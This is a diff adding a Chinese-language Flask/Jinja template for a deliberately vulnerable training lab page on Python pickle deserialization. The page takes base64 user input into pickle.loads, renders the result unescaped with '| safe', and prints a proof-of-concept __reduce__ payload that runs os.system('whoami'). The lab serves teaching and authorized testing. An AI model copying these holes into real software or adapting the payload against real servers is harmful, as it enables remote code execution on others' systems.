@@ -1,0 +1,52 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="content">
+    <div style="margin-bottom: 20px;">
+        <a href="/" class="btn btn-primary">← 返回首页</a>
+        <a href="/vuln/deserialization" class="btn btn-primary">查看详情</a>
+    </div>
+
+    <h1>🔒 反序列化漏洞演示</h1>
+    <div class="alert alert-danger">
+        <strong>⚠️ 危险环境</strong>
+        Python Pickle反序列化存在RCE漏洞，请仅在授权环境测试。
+    </div>
+
+    <div class="code-block" style="margin-bottom: 20px;">
+        <strong>易受攻击的代码：</strong>
+        <pre><code># 危险：直接反序列化不可信数据
+decoded = base64.b64decode(user_data)
+user_data = pickle.loads(decoded)</code></pre>
+    </div>
+
+    <form method="POST">
+        <div class="form-group">
+            <label for="data">Base64编码的序列化数据：</label>
+            <textarea id="data" name="data" rows="8" placeholder="输入Base64编码的Pickle数据..." required>{% if data_value %}{{ data_value }}{% endif %}</textarea>
+        </div>
+        <button type="submit" class="btn btn-danger">反序列化</button>
+    </form>
+
+    {% if result %}
+    <div style="margin-top: 20px;">
+        <h4>反序列化结果：</h4>
+        <div style="padding: 10px; background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 5px;">
+            <pre style="margin: 0;">{{ result | safe }}</pre>
+        </div>
+    </div>
+    {% endif %}
+
+    <div class="code-block" style="margin-top: 20px;">
+        <p><strong>POC测试示例：</strong></p>
+        <p>构造恶意pickle对象执行命令：</p>
+        <pre><code>class Exploit:
+    def __reduce__(self):
+        return (__import__('os').system, ('whoami',))
+
+malicious = pickle.dumps(Exploit())
+encoded = base64.b64encode(malicious).decode()</code></pre>
+        <p style="margin-top: 10px;"><strong>修复方案：</strong>使用JSON替代Pickle</p>
+    </div>
+</div>
+{% endblock %}
